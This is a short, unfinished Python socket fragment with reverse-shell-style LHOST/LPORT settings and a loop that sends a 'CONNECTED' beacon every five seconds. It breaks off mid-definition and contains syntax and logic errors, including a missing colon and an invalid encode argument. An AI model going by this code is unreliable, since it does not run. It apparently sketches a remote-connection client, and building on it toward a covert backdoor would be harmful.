import socket
import threading
import sys
import time

LHOST = "10.100.3.141"
LPORT = 5555

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.bind((LHOST,LPORT))

def sendConnection()
    while True:
        client.send('CONNECTED'.encode(2048))
        time.sleep(5)
    
def get

